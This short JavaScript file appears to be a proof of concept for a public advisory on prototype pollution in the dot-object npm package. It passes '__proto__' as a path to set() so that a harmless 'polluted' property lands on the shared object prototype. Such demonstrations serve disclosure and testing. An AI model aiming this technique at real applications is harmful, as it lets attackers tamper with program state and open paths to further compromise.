//https://snyk.io/vuln/SNYK-JS-DOTOBJECT-548905
var a = require("dot-object")
var obj = {}
var path = "__proto__";

var val = {polluted:"yes"}
a.set(path,val,{},true);
